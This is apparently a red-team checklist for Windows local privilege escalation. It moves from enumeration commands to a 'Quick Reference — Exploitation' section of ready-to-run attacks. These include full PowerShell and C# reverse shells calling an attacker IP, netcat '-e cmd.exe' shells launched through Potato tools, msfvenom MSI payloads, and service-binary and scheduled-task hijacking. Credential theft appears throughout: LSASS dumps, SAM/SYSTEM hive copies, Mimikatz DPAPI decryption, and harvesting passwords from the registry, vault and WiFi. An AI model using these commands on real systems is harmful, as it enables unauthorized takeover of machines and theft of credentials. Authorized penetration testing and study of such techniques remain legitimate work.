# Windows Privilege Escalation — Enumeration Checklist (2026)

A structured, command-ready checklist for Windows local privilege escalation. Designed for penetration testers and red teamers working on Windows 10/11 and Server 2016–2025 targets.

**Philosophy:** Enumerate everything before exploiting anything. Missed enumeration costs more time than thorough enumeration.

---

## Table of Contents

1. [Situational Awareness](#1-situational-awareness)
2. [User & Group Enumeration](#2-user--group-enumeration)
3. [Credential Harvesting](#3-credential-harvesting)
4. [Service Exploitation](#4-service-exploitation)
5. [Scheduled Tasks & Startup](#5-scheduled-tasks--startup)
6. [Registry Vectors](#6-registry-vectors)
7. [File System Recon](#7-file-system-recon)
8. [Token & Privilege Abuse](#8-token--privilege-abuse)
9. [Network & Lateral Movement](#9-network--lateral-movement)
10. [Software & Patch Analysis](#10-software--patch-analysis)
11. [Automated Tools](#11-automated-tools)
12. [Quick Reference — Exploitation](#12-quick-reference--exploitation)

---

## 1. Situational Awareness

**Goal:** Understand who you are, where you are, and what you're working with.

### Identity

```cmd
whoami
whoami /all
whoami /priv
whoami /groups
```

### System Information

```cmd
systeminfo
hostname
echo %PROCESSOR_ARCHITECTURE%

:: OS version and build (useful for kernel exploit matching)
ver
wmic os get Caption,Version,BuildNumber,OSArchitecture

:: Installed hotfixes
wmic qfe list brief
wmic qfe get HotFixID,InstalledOn | sort /r

:: Environment variables (look for non-standard paths, tools)
set
```

### PowerShell Version

```powershell
$PSVersionTable
Get-ExecutionPolicy -List
[System.Environment]::Is64BitProcess
```

### Domain or Workgroup

```cmd
:: Domain membership
systeminfo | findstr /i "domain"
nltest /dclist: 2>nul
net config workstation | findstr /i "domain"

:: If domain-joined
whoami /fqdn
nltest /dsgetdc: 2>nul
```

### Antivirus & Defenses

```cmd
:: Windows Defender status
sc query WinDefend
Get-MpComputerStatus 2>nul

:: Check if real-time protection is on
Get-MpPreference | Select-Object DisableRealtimeMonitoring

:: AppLocker rules
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

:: Firewall
netsh advfirewall show allprofiles state
netsh advfirewall firewall show rule name=all | findstr /i "rule name\|direction\|action\|program"

:: AMSI bypass indicators
reg query "HKLM\SOFTWARE\Microsoft\AMSI" 2>nul
```

---

## 2. User & Group Enumeration

**Goal:** Map all accounts, group memberships, and who has administrative access.

### Local Users

```cmd
net user
net user <username>

:: Detailed user info via WMIC
wmic useraccount get Name,SID,Status,Lockout,PasswordRequired

:: Who is currently logged in
qwinsta
query user
```

### Local Groups

```cmd
net localgroup
net localgroup Administrators
net localgroup "Remote Desktop Users"
net localgroup "Remote Management Users"
net localgroup "Backup Operators"

:: Power users and other interesting groups
net localgroup "Power Users" 2>nul
net localgroup "Network Configuration Operators" 2>nul
net localgroup "DnsAdmins" 2>nul
net localgroup "Hyper-V Administrators" 2>nul
net localgroup "Server Operators" 2>nul
net localgroup "Account Operators" 2>nul
net localgroup "Event Log Readers" 2>nul
```

### Domain Enumeration (if domain-joined)

```cmd
net user /domain
net group /domain
net group "Domain Admins" /domain
net group "Domain Controllers" /domain
net group "Enterprise Admins" /domain

:: Trust relationships
nltest /domain_trusts
```

---

## 3. Credential Harvesting

**Goal:** Find stored, cached, or exposed credentials.

### Stored Windows Credentials

```cmd
:: Credential Manager (generic credentials)
cmdkey /list

:: Windows Vault (shows Domain Password type that cmdkey hides)
vaultcmd /list
vaultcmd /listcreds:"Windows Credentials" /all
vaultcmd /listcreds:"Web Credentials" /all
```

> **Lesson learned:** `cmdkey /list` does NOT show Domain Password credentials. Always check `vaultcmd` as well.

### Registry — AutoLogon

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword AutoAdminLogon"
```

### Registry — Stored Passwords

```cmd
:: VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password" 2>nul
reg query "HKLM\SOFTWARE\ORL\WinVNC\Default" 2>nul
reg query "HKLM\SOFTWARE\RealVNC\vncserver" /v Password 2>nul

:: PuTTY sessions (proxy passwords, stored sessions)
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s 2>nul

:: Saved RDP connections
reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s 2>nul

:: SNMP community strings
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities" 2>nul

:: WinSCP
reg query "HKCU\Software\Martin Prikryl\WinSCP 2\Sessions" /s 2>nul

:: Broad search for password strings in registry
reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i "password"
reg query HKCU /f password /t REG_SZ /s 2>nul | findstr /i "password"
```

### PowerShell History

```powershell
# Current user
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# All accessible user profiles
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue | ForEach-Object { Write-Host "`n=== $($_.FullName) ==="; Get-Content $_ }
```

### DPAPI Credentials

```cmd
:: List DPAPI credential blobs
dir /a C:\Users\*\AppData\Local\Microsoft\Credentials\
dir /a C:\Users\*\AppData\Roaming\Microsoft\Credentials\

:: List DPAPI master keys
dir /a C:\Users\*\AppData\Roaming\Microsoft\Protect\*\

:: Mimikatz DPAPI extraction (if available)
:: Step 1: Identify guidMasterKey
dpapi::cred /in:<credential_blob_path>

:: Step 2: Decrypt master key with known password
dpapi::masterkey /in:<masterkey_path> /sid:<user_SID> /password:<known_password>

:: Step 3: Decrypt credential with master key
dpapi::cred /in:<credential_blob_path> /masterkey:<decrypted_key>
```

### Unattended Installation Files

```cmd
:: These files may contain base64-encoded passwords
type C:\Unattend.xml 2>nul
type C:\Windows\Panther\Unattend.xml 2>nul
type C:\Windows\Panther\unattend\Unattend.xml 2>nul
type C:\Windows\System32\Sysprep\unattend.xml 2>nul
type C:\Windows\System32\Sysprep\Panther\unattend.xml 2>nul
dir C:\Windows\Panther\ 2>nul
```

### IIS & Web Config Files

```cmd
type C:\inetpub\wwwroot\web.config 2>nul
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config 2>nul

:: Search for connection strings
findstr /si "connectionString password" C:\inetpub\*.config 2>nul
```

### WiFi Passwords

```cmd
netsh wlan show profiles
netsh wlan show profile name="<SSID>" key=clear
```

### SAM & SYSTEM Backups

```cmd
:: If accessible, can extract local hashes offline
dir C:\Windows\Repair\SAM 2>nul
dir C:\Windows\Repair\SYSTEM 2>nul
dir C:\Windows\System32\config\RegBack\ 2>nul

:: Volume shadow copies
vssadmin list shadows 2>nul
```

### Clipboard

```powershell
Get-Clipboard 2>nul
```

---

## 4. Service Exploitation

**Goal:** Find services with weak permissions, writable binaries, or unquoted paths.

### List All Services — Filter by Account (NOT by path)

```cmd
:: PRIMARY COMMAND — filter by run account, not path
wmic service get name,startname,pathname | findstr /i /v "LocalSystem LocalService NetworkService"

:: Full service listing without any filter
wmic service get name,displayname,pathname,startmode,startname

:: Search for specific user accounts
wmic service get name,startname,pathname | findstr /i "svcadmin notadmin thmuser"
```

> **Critical rule:** NEVER use `findstr /v "C:\Windows"` to filter services. Custom services may reside inside `C:\Windows\` subdirectories and will be hidden. Always filter by **service account** instead.

### Check Service Binary Permissions

```cmd
:: For each non-standard service, check if the binary is writable
icacls "C:\path\to\service.exe"

:: Look for (F) = Full Control, (M) = Modify, (W) = Write
:: If your user or group has F/M/W — service binary hijacking is possible
```

### Unquoted Service Paths

```cmd
:: Find services with unquoted paths containing spaces
wmic service get name,pathname,startmode | findstr /i /v """
```

If a service path is `C:\Program Files\Some App\service.exe` (unquoted), Windows tries these in order:
1. `C:\Program.exe`
2. `C:\Program Files\Some.exe`
3. `C:\Program Files\Some App\service.exe`

If you can write to any of the intermediate directories, place a malicious binary there.

### Service Configuration Permissions

```cmd
:: Check if you can modify service configuration
sc sdshow <ServiceName>

:: Try to change the binary path
sc config <ServiceName> binPath= "C:\path\to\payload.exe"

:: Try to change the run account
sc config <ServiceName> obj= LocalSystem password= ""
```

### Service DLL Hijacking

```cmd
:: Check for services loading DLLs from writable locations
:: Use Process Monitor (if available) to monitor DLL load attempts
reg query "HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>\Parameters" 2>nul
```

### Service Restart Permissions

```cmd
sc query <ServiceName>
sc stop <ServiceName>
sc start <ServiceName>

:: Check SDDL for RP (start) and WP (stop) permissions
:: BU = BUILTIN\Users, AU = Authenticated Users, BA = BUILTIN\Administrators
sc sdshow <ServiceName>
```

---

## 5. Scheduled Tasks & Startup

**Goal:** Find scheduled tasks running as higher-privilege accounts with writable scripts/binaries.

### Scheduled Tasks

```cmd
:: Full listing with Run As User
schtasks /query /fo LIST /v

:: Filtered view — Task name, command, and run account
schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As User\|Task Name"

:: Look for tasks running as SYSTEM with writable scripts
schtasks /query /fo LIST /v | findstr /i "SYSTEM"

:: Check if you can create scheduled tasks
schtasks /create /tn TestTask /tr cmd.exe /sc once /st 00:00 /ru SYSTEM 2>&1
schtasks /delete /tn TestTask /f 2>nul
```

### Check Writable Task Scripts

```cmd
:: For every .bat/.ps1/.cmd/.vbs referenced in scheduled tasks:
icacls "C:\path\to\script.bat"

:: Common location for legacy tasks
dir C:\Windows\Tasks\ /a
icacls C:\Windows\Tasks\*

:: Look for (M) Modify or (F) Full Control for your user
```

### Startup Locations

```cmd
:: All users startup folder
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\" /a

:: Per-user startup folders
dir "C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" /a 2>nul

:: Registry Run keys
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

:: Can you write to any startup folder?
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
```

---

## 6. Registry Vectors

**Goal:** Find registry-based privilege escalation paths.

### AlwaysInstallElevated

```cmd
:: Both keys must be set to 1 for exploitation
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>nul
```

If both are `0x1`, generate a malicious MSI: `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o shell.msi` and install with `msiexec /quiet /qn /i shell.msi`.

### Service Registry Permissions

```cmd
:: Check if you can write to service registry keys directly
:: Even if sc config is denied, registry write may work
reg query "HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>"

:: Try writing ImagePath
reg add "HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>" /v ImagePath /t REG_EXPAND_SZ /d "C:\payload.exe" /f 2>&1
```

### LSA Protection & Credential Guard

```cmd
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL 2>nul
reg query "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity 2>nul
```

### UAC Settings

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v FilterAdministratorToken

:: EnableLUA=0 means UAC is disabled
:: ConsentPromptBehaviorAdmin=0 means no prompt (auto-elevate)
```

---

## 7. File System Recon

**Goal:** Find sensitive files, writable directories, and exposed data.

### Sensitive File Search

```powershell
# Broad search for files that may contain passwords
Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.ini,*.bat,*.ps1,*.cmd,*.cfg,*.config,*.bak -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Length -lt 50000 -and $_.FullName -notmatch 'Windows\\(assembly|WinSxS|servicing|Packages|Microsoft.NET)'} | Select-Object FullName,Length

# Search file contents for password strings
findstr /si "password" C:\*.txt C:\*.xml C:\*.ini C:\*.cfg 2>nul
findstr /si "password" C:\Users\*.txt C:\Users\*.xml 2>nul
```

### Non-Standard Directories

```cmd
:: Check root of C: for non-default folders
dir C:\ /a

:: Common locations for tools, scripts, and sensitive data
dir C:\Temp\ 2>nul
dir C:\Tools\ 2>nul
dir C:\Scripts\ 2>nul
dir C:\Shares\ 2>nul
dir C:\Backups\ 2>nul
dir C:\inetpub\ 2>nul
```

### User Profile Access

```cmd
:: Can you access other users' profiles?
dir C:\Users\ /a
dir C:\Users\<target_user>\Desktop\ 2>nul
dir C:\Users\<target_user>\Documents\ 2>nul
dir C:\Users\<target_user>\Downloads\ 2>nul
```

### Writable System Directories

```cmd
:: Check for writable directories in PATH
echo %PATH%

:: Check write access to common locations
icacls C:\Windows\Temp\
icacls C:\Windows\Tasks\
icacls C:\Windows\System32\spool\drivers\color\
```

### Recently Modified Files

```powershell
# Files modified in the last 7 days (may reveal admin activity)
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-7) -and !$_.PSIsContainer} | Sort-Object LastWriteTime -Descending | Select-Object FullName,LastWriteTime -First 50
```

---

## 8. Token & Privilege Abuse

**Goal:** Exploit dangerous privileges assigned to the current user.

### Privilege Mapping

| Privilege | Attack | Tool |
|-----------|--------|------|
| **SeImpersonatePrivilege** | Potato attacks (impersonate SYSTEM token) | GodPotato, PrintSpoofer, JuicyPotato, SweetPotato |
| **SeAssignPrimaryTokenPrivilege** | Same as SeImpersonate | Same tools |
| **SeDebugPrivilege** | Inject into SYSTEM process or dump LSASS | Mimikatz, procdump |
| **SeBackupPrivilege** | Read any file (SAM/SYSTEM) | robocopy with /b flag, diskshadow |
| **SeRestorePrivilege** | Write any file (DLL hijack, service binary) | robocopy with /b flag |
| **SeTakeOwnershipPrivilege** | Take ownership of any object | takeown + icacls |
| **SeLoadDriverPrivilege** | Load vulnerable kernel driver | Capcom.sys exploit |
| **SeManageVolumePrivilege** | Read any file via disk access | Exploit tool |

### Potato Attacks (SeImpersonatePrivilege)

```cmd
:: Check for the privilege
whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"

:: GodPotato (works on modern Windows, recommended for 2024+)
GodPotato.exe -cmd "cmd /c whoami > C:\Users\Public\potato.txt"

:: PrintSpoofer (requires Print Spooler service running)
PrintSpoofer64.exe -i -c cmd

:: SweetPotato
SweetPotato.exe -e EfsRpc -p C:\Users\Public\nc.exe -a "<ATTACKER_IP> <PORT> -e cmd.exe"
```

### SeBackupPrivilege

```cmd
:: Copy SAM and SYSTEM hives
reg save HKLM\SAM C:\Users\Public\SAM
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM

:: Or use robocopy with backup semantics
robocopy /b C:\Windows\System32\config C:\Users\Public\ SAM SYSTEM
```

### SeDebugPrivilege

```cmd
:: Dump LSASS memory
procdump.exe -accepteula -ma lsass.exe C:\Users\Public\lsass.dmp

:: Or use mimikatz
sekurlsa::logonpasswords
```

---

## 9. Network & Lateral Movement

**Goal:** Understand network position and find paths to other systems.

### Network Configuration

```cmd
ipconfig /all
route print
arp -a
netstat -ano

:: DNS cache (may reveal internal services)
ipconfig /displaydns | findstr "Record"
```

### Listening Services & Internal Ports

```cmd
:: Find services listening on localhost only (potential port forwarding targets)
netstat -ano | findstr "LISTENING"

:: Look for interesting internal ports:
:: 3306 (MySQL), 5432 (PostgreSQL), 8080 (web), 1433 (MSSQL), 27017 (MongoDB)
```

### SMB Shares

```cmd
net share
net use
net view \\<TARGET_IP> 2>nul

:: Enumerate all accessible shares
Get-SmbShare 2>nul
```

### Network Drives & TSCLIENT

```cmd
:: Mounted drives and RDP shared drives
net use
wmic logicaldisk get caption,description,providername

:: RDP-shared drives (TSCLIENT)
dir \\TSCLIENT\ 2>nul
```

### Hosts File & DNS

```cmd
type C:\Windows\System32\drivers\etc\hosts
```

---

## 10. Software & Patch Analysis

**Goal:** Find vulnerable installed software and missing patches.

### Installed Software

```cmd
:: 64-bit programs
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s | findstr /i "DisplayName DisplayVersion"

:: 32-bit programs on 64-bit OS
reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall" /s | findstr /i "DisplayName DisplayVersion"

:: Alternative
wmic product get name,version 2>nul
```

### Kernel Exploit Candidates

```cmd
:: Get exact OS build for exploit matching
systeminfo | findstr /i "OS Version"
wmic os get BuildNumber

:: Cross-reference with:
:: - https://github.com/SecWiki/windows-kernel-exploits
:: - https://github.com/bitsadmin/wesng (Windows Exploit Suggester)
```

Common kernel exploits by build:

| Build Range | CVE | Name |
|-------------|-----|------|
| Server 2019 < 17763.xxx | Various | Check WES-NG |
| Windows 10 < 19041 | CVE-2021-1732 | Win32k Elevation |
| Any < March 2022 | CVE-2022-0847 | (Linux only: Dirty Pipe) |
| Any < Feb 2021 | CVE-2021-4034 | (Linux only: PwnKit) |
| Server 2019/2022 | CVE-2021-36934 | HiveNightmare/SeriousSAM |
| Windows 10/11 | CVE-2023-28252 | CLFS driver exploit |
| Windows 10/11/Server | CVE-2024-30088 | NtQueryInformationToken |

### Driver Vulnerabilities

```cmd
:: List installed drivers (look for third-party/vulnerable ones)
driverquery /v /fo list

:: BYOVD (Bring Your Own Vulnerable Driver) targets
:: Capcom.sys, RTCore64.sys, DBUtil_2_3.sys
```

---

## 11. Automated Tools

### WinPEAS (Recommended First Run)

```cmd
:: Checks hundreds of vectors automatically
:: Download: https://github.com/carlospolop/PEASS-ng
winpeasx64.exe

:: Quiet mode (less output)
winpeasx64.exe quiet

:: Specific checks only
winpeasx64.exe servicesinfo
```

### PowerUp (PowerShell)

```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Specific checks
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService
```

### SharpUp (C#)

```cmd
SharpUp.exe audit
```

### Seatbelt (Comprehensive Info Gathering)

```cmd
Seatbelt.exe -group=all
Seatbelt.exe -group=user
Seatbelt.exe -group=system
```

### PrivescCheck (PowerShell, Modern)

```powershell
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended
```

### Windows Exploit Suggester

```bash
# On attacker machine
python wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only
```

---

## 12. Quick Reference — Exploitation

### Service Binary Hijacking

```cmd
:: 1. Find writable service binary
icacls "C:\path\to\service.exe"

:: 2. Backup original
copy "C:\path\to\service.exe" "C:\path\to\service.exe.bak"

:: 3. Replace with payload
copy /Y payload.exe "C:\path\to\service.exe"

:: 4. Restart service (error 1053 is normal if payload doesn't implement SCM API)
sc stop <ServiceName>
sc start <ServiceName>
```

### Scheduled Task Script Overwrite

```cmd
:: 1. Find writable script executed by SYSTEM task
icacls "C:\Windows\Tasks\cleanup.bat"

:: 2. Replace content with reverse shell
echo C:\Users\Public\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe > C:\Windows\Tasks\cleanup.bat

:: 3. Wait for task to execute (or trigger manually if possible)
```

### Unquoted Service Path

```cmd
:: 1. Find unquoted path with spaces
:: Example: C:\Program Files\My App\service.exe

:: 2. Place payload at intermediate path
copy payload.exe "C:\Program Files\My.exe"

:: 3. Restart service
sc stop <ServiceName>
sc start <ServiceName>
```

### AlwaysInstallElevated → MSI Payload

```bash
# Generate MSI (on attacker machine)
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o shell.msi
```

```cmd
:: Install silently (on target)
msiexec /quiet /qn /i C:\Users\Public\shell.msi
```

### Token Impersonation (SeImpersonatePrivilege)

```cmd
:: GodPotato — most reliable on modern Windows
GodPotato.exe -cmd "C:\Users\Public\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe"

:: PrintSpoofer — requires Spooler service
PrintSpoofer64.exe -i -c "C:\Users\Public\nc.exe <ATTACKER_IP> <PORT> -e cmd.exe"
```

### DPAPI Credential Extraction (Mimikatz)

```
:: Step 1: Read credential blob header
dpapi::cred /in:C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\<blob>

:: Step 2: Decrypt master key with known password
dpapi::masterkey /in:C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\<masterkey_guid> /sid:<SID> /password:<password>

:: Step 3: Decrypt credential
dpapi::cred /in:<blob_path> /masterkey:<decrypted_key>
```

### UAC Bypass (If Admin But Non-Elevated)

```cmd
:: Check if in Administrators group but not elevated
whoami /groups | findstr "S-1-5-32-544"
whoami /groups | findstr "Medium Mandatory Level"

:: If both match — UAC bypass is applicable
:: Use fodhelper, eventvwr, or UACME tool
```

### Reverse Shell One-Liners

```powershell
# PowerShell reverse shell (no files on disk)
$client = New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```cmd
:: Netcat reverse shell
nc.exe <ATTACKER_IP> <PORT> -e cmd.exe
```

### C# Reverse Shell (Compile On Target)

```csharp
// Save as shell.cs, compile with csc.exe
using System;
using System.IO;
using System.Net.Sockets;
using System.Diagnostics;
using System.Threading;
class P {
    static void Main() {
        TcpClient c = new TcpClient("<ATTACKER_IP>", <PORT>);
        Stream s = c.GetStream();
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.RedirectStandardInput = true;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.CreateNoWindow = true;
        p.Start();
        new Thread(() => { p.StandardOutput.BaseStream.CopyTo(s); }).Start();
        new Thread(() => { p.StandardError.BaseStream.CopyTo(s); }).Start();
        s.CopyTo(p.StandardInput.BaseStream);
    }
}
```

```cmd
:: Compile on target
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:shell.exe shell.cs
```

---

## Methodology Flowchart

```
[Got Shell] → whoami /all → Check Privileges
    │
    ├─ SeImpersonate? ──→ GodPotato / PrintSpoofer → SYSTEM
    ├─ SeDebug? ────────→ Dump LSASS / Inject → SYSTEM
    ├─ SeBackup? ───────→ Copy SAM+SYSTEM → Crack Hashes
    ├─ Admin but Medium? → UAC Bypass → Elevated Admin
    │
    └─ No special privileges? Continue enumeration:
        │
        ├─ Credentials ──→ AutoLogon, cmdkey, vaultcmd, PS history,
        │                   Unattend.xml, DPAPI, WiFi passwords
        │
        ├─ Services ─────→ Filter by ACCOUNT (not path!)
        │                   Check binary permissions (icacls)
        │                   Check unquoted paths
        │                   Check config permissions (sc config)
        │
        ├─ Scheduled Tasks → Find SYSTEM tasks with writable scripts
        │                     Check icacls on referenced .bat/.ps1/.cmd
        │
        ├─ Registry ─────→ AlwaysInstallElevated
        │                   Service registry permissions
        │
        ├─ File System ──→ Non-standard directories
        │                   Writable locations in PATH
        │                   Sensitive files (*.bak, *.config)
        │
        └─ Kernel ───────→ systeminfo → WES-NG → Exploit
```

---

## Version History

- **2026-06-08** — Initial version, based on practical experience from TryHackMe labs and real-world engagements
